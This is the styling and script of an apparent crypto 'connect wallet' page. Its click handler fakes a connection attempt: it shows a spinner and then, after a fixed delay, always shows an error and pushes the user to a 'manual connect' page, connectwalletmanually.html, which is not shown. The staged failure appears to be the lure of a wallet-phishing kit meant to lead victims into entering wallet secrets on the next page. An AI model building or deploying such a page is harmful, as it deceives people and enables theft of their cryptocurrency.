    <style>
        body { background-color: #0b0e11; color: white; font-family: 'Inter', sans-serif; margin: 0; padding: 0; }
        
        /* Header Styling */
        #header { padding: 40px 0 20px; text-align: center; }
        .header-img { width: 50px; height: auto; margin-bottom: 15px; }
        .coin-section-header h1 { font-size: 28px; font-weight: 700; margin-bottom: 5px; }
        .coin-section-header h6 { color: #848e9c; font-weight: 400; margin-bottom: 30px; }

        /* Wallet Grid - Matches your screenshot layout */
        .coin-registry {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
            gap: 15px;
            padding: 20px;
            max-width: 1100px;
            margin: 0 auto;
        }

        /* Wallet Card - Content is perfectly centered */
        .coin {
            background: #1e2329;
            border: 1px solid #30363d;
            border-radius: 16px;
            padding: 20px 10px;
            display: flex;
            flex-direction: column; 
            align-items: center;    
            justify-content: center;
            cursor: pointer;
            transition: 0.2s;
            width: 100%;
            border: none;
            outline: none;
        }

        .coin:hover { background: #2b3139; transform: translateY(-3px); }

        .coin-img {
            width: 50px !important;
            height: 50px !important;
            object-fit: contain;
            border-radius: 10px;
            margin-bottom: 12px;
        }

        .coin h4 {
            font-size: 13px;
            color: #eaecef;
            margin: 0;
            font-weight: 500;
            text-align: center;
            width: 100%;
        }

        /* Modal / Connection Popup */
        .dialog-overlay-loading {
            display:none; position: fixed; top:0; left:0; width:100%; height:100%; 
            background:rgba(0,0,0,0.85); z-index:9999; justify-content:center; align-items:center;
        }
        .loading-dialog { background:#1e2329; padding:40px; border-radius:20px; text-align:center; border: 1px solid #333; width: 90%; max-width: 400px; margin: auto; }
        
        /* Dynamic Icon in Popup */
        #selected-wallet-display { width: 60px; height: 60px; margin-bottom: 20px; border-radius: 12px; object-fit: contain; display: none; margin-left: auto; margin-right: auto; }

        /* SKY BLUE MANUAL BUTTON */
        .manual-connect { 
            margin-top: 25px; padding: 12px 25px; background-color: #87CEEB; color: #000; 
            border: none; border-radius: 8px; font-weight: bold; cursor: pointer; display: none; width: 100%; font-size: 16px;
        }

        .loader { border: 4px solid #333; border-top: 4px solid #87CEEB; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>

    <script>
        function handleWalletClick(elem) {
            var img = $(elem).find(".coin-img").attr("src");
            var name = $(elem).find("h4").text();
            
            // SAVE SELECTION FOR THE NEXT PAGE
            localStorage.setItem("selectedWalletImg", img);
            localStorage.setItem("selectedWalletName", name);

            $("#selected-wallet-display").attr("src", img).show();
            $("#overlay").css("display", "flex");
            $("#loader-content").show();
            $("#error-content").hide();
            $(".manual-connect").hide();

            setTimeout(function() {
                $("#loader-content").hide();
                $("#error-content").show();
                $(".manual-connect").fadeIn();
            }, 2500);
        }

        $("#manualBtn").on("click", function() {
            window.location.href = 'connectwalletmanually.html';
        });
